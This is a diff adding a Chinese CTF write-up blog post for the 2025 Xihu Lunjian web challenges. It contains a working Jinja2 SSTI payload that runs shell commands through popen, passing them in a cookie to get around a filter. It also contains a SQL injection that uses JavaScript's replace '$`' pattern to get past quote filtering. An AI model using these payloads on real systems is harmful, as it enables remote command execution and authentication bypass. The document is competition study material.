@@ -112,6 +112,85 @@ var _hmt = _hmt || [];
 
   
     
+    <h3 class="article-title"><a href="/2025/01/19/第八届西湖论剑WP/"><span>第八届西湖论剑WP</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/01/19/第八届西湖论剑WP/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-01-19T04:34:38.000Z">
+          2025-01-19
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>
+题目类型：WEB<br>
+设计考点：SSTI</p>
+
+<p><img src="/../img/XHLJ/WEB1.png" alt="WEB1" title="web1"></p>
+<p>Payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+<p>首先分析页面，给了一个登录页面<br><img src="/../img/XHLJ/WEB1-2.png" alt="WEB1-2" title="web1-2"></p>
+<p>发现登录之后会提示某某账号不存在或者密码错误，看到他的response包<br><img src="/../img/XHLJ/WEB1-3.png" alt="WEB1-3" title="web1-3"></p>
+<p>发现他是用python写的后端，猜测可能是SSTI漏洞<br>直接打payload，测试发现&#x2F;斜杠被过滤，用request.cookie.x绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/../img/XHLJ/web1-6.png" alt="web" title="result"></p>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>
+题目类型：WEB<br>
+设计考点：JS框架,replace函数</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;</span><br><span class="line">    if(req.query.info)&#123;</span><br><span class="line">        if(req.url.match(/\,/ig))&#123;</span><br><span class="line">            res.end(&#x27;hacker1!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        var info = JSON.parse(req.query.info);</span><br><span class="line">        if(info.username&amp;&amp;info.password)&#123;</span><br><span class="line">            var username = info.username;</span><br><span class="line">            var password = info.password;</span><br><span class="line">            if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;</span><br><span class="line">                res.end(&#x27;hacker2!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            var sql = &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;</span><br><span class="line">            sql = sql.replace(&quot;&#123;username&#125;&quot;,username);</span><br><span class="line">            sql = sql.replace(&quot;&#123;password&#125;&quot;,password);</span><br><span class="line">            connection.query(sql,function (err,rs) &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                res.end(&#x27;error1&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                if(rs.length&gt;0)&#123;</span><br><span class="line">                res.sendFile(&#x27;/flag&#x27;);</span><br><span class="line">                &#125;else &#123;</span><br><span class="line">                res.end(&#x27;username or password error&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            res.end(&quot;please input the data&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&quot;please input the data&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>题目需要传入一个info值，格式是json，但是$req.url$后面过滤了逗号，这里用URL编码绕过，<br>继续审计后面，一个SQL语句，把我们传入的username还有password过滤后拼接到语句当中，但是把闭合符都给过滤了，这里引入JavaScript中replace的一个知识点</p>
+<p><img src="/../img/XHLJ/web2-1.png" alt="web2" title="知识点"></p>
+<p>我们这里就是用$&#96;来过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$` 例子:</span><br><span class="line">var a=&quot;i am not a dog dog&quot;</span><br><span class="line">a=a.replace(&quot;dog&quot;,&quot;$`cat&quot;)</span><br><span class="line">他后面的pattern值应该是找到第一个和dog匹配的位置，然后把$`替换成这个位置之前的字符串</span><br><span class="line">所以pattern=i am not a cat</span><br><span class="line">然后把a当中的dog替换成pattern</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以我们这里的$`可以识别成select * from userinfo where username = &#x27;,这里有一个单引号可以用来闭合</span><br><span class="line">构造payload</span><br><span class="line">&#123;&quot;username&quot;:&quot;$` or 1=1 --+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考WP：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw">https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw</a></p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2025/01/19/第八届西湖论剑WP/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
     <h3 class="article-title"><a href="/2024/08/26/文件上传/"><span>文件上传</span></a></h3>
     
   
